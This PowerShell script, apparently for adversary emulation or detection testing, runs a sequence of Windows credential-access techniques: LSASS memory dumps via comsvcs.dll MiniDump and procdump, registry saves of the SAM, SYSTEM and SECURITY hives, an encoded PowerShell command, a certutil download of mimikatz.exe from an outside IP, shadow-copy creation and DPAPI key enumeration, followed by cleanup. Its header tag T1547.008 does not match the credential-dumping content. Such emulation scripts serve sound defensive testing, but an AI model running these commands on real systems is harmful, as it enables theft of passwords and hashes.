Write-Host "[T1547.008] LSASS Credential Access" -ForegroundColor Red

$lsass = Get-Process lsass
Write-Host "[*] LSASS PID: $($lsass.Id)"

Write-Host "[1] rundll32 comsvcs.dll MiniDump on LSASS..."
& rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) "$env:TEMP\debug.dmp" full 2>&1

Write-Host "[2] tasklist /fi to find LSASS..."
& tasklist.exe /fi "IMAGENAME eq lsass.exe" /v 2>&1

Write-Host "[3] procdump on LSASS..."
& procdump.exe -accepteula -ma lsass.exe "$env:TEMP\ls.dmp" 2>&1
& procdump64.exe -accepteula -ma lsass.exe "$env:TEMP\ls.dmp" 2>&1

Write-Host "[4] reg save SAM/SYSTEM/SECURITY..."
& reg.exe save HKLM\SAM "$env:TEMP\sam.hiv" /y 2>&1
& reg.exe save HKLM\SYSTEM "$env:TEMP\sys.hiv" /y 2>&1
& reg.exe save HKLM\SECURITY "$env:TEMP\sec.hiv" /y 2>&1

Write-Host "[5] Encoded PowerShell cred dump command..."
$cmd = 'Get-Process lsass | ForEach-Object { $_.Modules } | Select-Object FileName'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
& powershell.exe -NoProfile -NonInteractive -EncodedCommand $enc 2>&1

Write-Host "[6] certutil copy of ntds.dit pattern..."
& certutil.exe -urlcache -split -f "http://198.51.100.1/mimikatz.exe" "$env:TEMP\mimi.exe" 2>&1
Remove-Item "$env:TEMP\mimi.exe" -Force -ErrorAction SilentlyContinue

Write-Host "[7] Volume shadow copy (ntds.dit steal pattern)..."
& vssadmin.exe create shadow /for=C: 2>&1
& wmic.exe shadowcopy list brief 2>&1

Write-Host "[8] DPAPI masterkey enum..."
& dir "$env:APPDATA\Microsoft\Protect" /s 2>&1
& dir "$env:LOCALAPPDATA\Microsoft\Credentials" /s 2>&1

Remove-Item "$env:TEMP\debug.dmp","$env:TEMP\ls.dmp","$env:TEMP\sam.hiv","$env:TEMP\sys.hiv","$env:TEMP\sec.hiv" -Force -ErrorAction SilentlyContinue
Write-Host "[T1547.008] Done." -ForegroundColor Cyan
